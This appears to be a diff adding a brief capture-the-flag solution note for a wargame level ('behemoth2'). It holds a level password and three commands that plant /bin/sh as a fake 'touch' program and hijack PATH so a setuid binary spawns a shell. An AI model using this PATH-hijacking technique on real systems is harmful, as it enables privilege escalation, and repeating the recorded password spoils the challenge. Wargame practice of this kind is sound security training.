@@ -1,0 +1,5 @@
+pass: eimahquuof
+
+echo /bin/sh > /tmp/touch/touch
+chmod +x /tmp/touch/touch
+PATH=/tmp/touch /behemoth/behemoth2
